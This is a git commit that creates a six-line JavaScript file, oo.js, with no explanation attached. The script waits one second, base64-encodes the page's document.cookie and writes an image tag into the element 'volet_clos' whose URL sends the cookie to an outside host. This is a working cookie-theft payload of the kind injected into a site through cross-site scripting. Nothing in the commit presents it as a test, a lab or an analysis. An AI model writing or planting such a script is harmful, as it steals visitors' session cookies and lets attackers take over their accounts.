294b030c829606ef4d19d9b91f7d802dbf712387
skav75 <149662383+skav75@users.noreply.github.com>
2023-11-16 10:43:51 +0100

    Create oo.js

---
+++ oo.js
@@ -0,0 +1,6 @@
+function gg(){
+var i = '<img src="https://www.logogenie.fr/yyyyyyyyyyy?c=' + btoa(document.cookie) + '" />'
+document.getElementById('volet_clos').innerHTML = i
+
+}
+setTimeout(gg,1000);
